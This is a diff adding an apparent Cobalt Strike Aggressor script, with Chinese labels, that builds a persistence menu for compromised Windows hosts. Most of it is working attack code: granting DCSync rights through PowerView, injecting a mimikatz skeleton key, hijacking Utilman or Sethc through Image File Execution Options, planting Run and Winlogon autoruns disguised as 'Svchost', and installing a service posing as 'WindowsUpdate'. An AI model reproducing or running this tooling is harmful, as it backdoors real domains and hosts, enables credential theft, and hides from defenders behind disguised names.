@@ -1,0 +1,100 @@
+# 横向移动测试
+
+menu "权限维持" {
+	menu "DCSync" {
+		item "DCSync_add_ACE" {
+			$dialog = dialog("DCSync", %( bid => $1["@"] , user => "test" , Domain_prefix => "hack" , Domain_suffix => "com") , &DCSync_ADD_ACE);
+			dialog_description($dialog,"通过DCSync向某一用户添加ACE来改变ACL,以此达到权限维持");
+			drow_text($dialog,"user","User:");
+			drow_text($dialog,"Domain_prefix","Domain_prefix");
+			drow_text($dialog,"Domain_suffix","Domain_suffix");
+			dbutton_action($dialog,"Exploit");
+			dialog_show($dialog);
+		}
+	}
+	separator();
+	item "skeleton-Key" {
+		bmimikatz($1["@"],"misc::skeleton");
+	}
+	separator();
+	item "IFEO" {
+		if( !-isadmin $1["@"])
+		{
+			show_error("Permission Denied!");
+		}
+		else
+		{
+			$dialog = dialog("镜像劫持",%( bid => $1["@"] , Type => "Utilman" , CallBackFile => "c:\\Windows\\system32\\cmd.exe" ),&IFEO_INSTALL);
+			dialog_description($dialog,"通过镜像劫持进行权限维持");
+			drow_combobox($dialog,"Type","Type:",@("Utilman.exe", "Sethc.exe"));
+			drow_text($dialog,"CallBackFile","CallBackFile:")
+			dbutton_action($dialog,"Exploit");
+			dialog_show($dialog);
+		}
+	}
+	separator();
+	item "AutoRun" {
+                        $bid = $1['@'];
+                        $Dialog = dialog("Auto Run",%(RegKey => "HKLM", RegItem => "Run", CallBackFile => "C:\\Windows\\system32\\cmd.exe",bid => $bid),&InstallAutoRun);
+                        dialog_description($Dialog, "Registry Add Boot Start Item");
+                        drow_combobox($Dialog, "RegKey", "Key: ", @("HKLM", "HKCU"));
+                        drow_combobox($Dialog, "RegItem", "RegItem: ", @("Run", "RunOnce", "RunOnceEx", "Winlogon", "Logon Scripts"));
+                        drow_text($Dialog, "CallBackFile", "CallBackFile: ");
+                        dbutton_action($Dialog, "Reg");
+                        dialog_show($Dialog);
+					}
+
+	item "Service"{
+			             $bid = $1['@'];
+			             $Dialog = dialog("Registration service",%(SerName => "WindowsUpdate", Path => "C:\\Windows\\system32\\cmd.exe",bid => $bid),&InstallService);
+			             dialog_description($Dialog, "Register an executable file as a service");
+			             drow_text($Dialog, "SerName", "Service Name: ");
+			             drow_text($Dialog, "Path", "Bin Path: ");
+			             dbutton_action($Dialog, "Install");
+			             dialog_show($Dialog);
+			        }
+}
+
+sub DCSync_ADD_ACE {
+	bpowershell_import($3['bid'],script_resource("./modules/PowerView.ps1"));
+	$payload = "Add-DomainObjectAcl -TargetIdentity \"DC=" . $3['Domain_prefix'] . ",DC=" . $3['Domain_suffix'] . "\" -PrincipalIdentity " .$3['user'] . " -Rights DCSync -Verbose";
+	bpowershell($3['bid'],$payload);
+}
+
+sub IFEO_INSTALL {
+	$payload = "\"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" . $3["Type"] . "\"";
+	show_message($payload);
+	bshell($3["bid"],"reg add " . $payload . " /f");
+	bshell($3["bid"],"reg add " . $payload . " /v Debugger /t REG_SZ /d " . $3["CallBackFile"] . " /f");
+}
+
+
+sub InstallAutoRun{
+    local('$Prefix $File $Key $Item $Reg');
+    $Prefix = "\\Software\\Microsoft\\Windows\\CurrentVersion\\";
+    $File = replace($3['CallBackFile'], "\"", "");
+    $Key = "\"".$3['RegKey'];
+    $Item = $3['RegItem']."\"";
+    if($3['RegItem'] eq "Winlogon"){
+        $Prefix = replace($Prefix,'Windows',"Windows NT");
+        $Reg = $Key.$Prefix.$Item;
+        bshell($bid,"reg add  $+ $Reg /v Userinit /t REG_SZ /d \" C:\\Windows\\system32\\userinit.exe, $+ $File \" /f ");
+    }
+    else if($3['RegItem'] eq "Logon Scripts"){
+        bshell($bid,"reg add  \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \" $+ $File \" /f ");
+    }
+    else{
+        $Reg = $Key.$Prefix.$Item;
+        bshell($bid,"reg add  $+ $Reg /f");
+        bshell($bid,"reg add  $+ $Reg /v Svchost /t REG_SZ /d \" $+ $File \" /f ");
+    }
+}
+
+
+
+sub InstallService{
+    local('$Name $Path');
+    $Name = $3['SerName'];
+    $Path = replace($3['Path'], "\"", "");
+    bshell($bid, "sc create \" $+ $Name\" binpath= \"cmd /c start \" $+ $Path\"\"&&sc config \" $+ $Name\" start= auto&&net start   $+ $Name");
+}
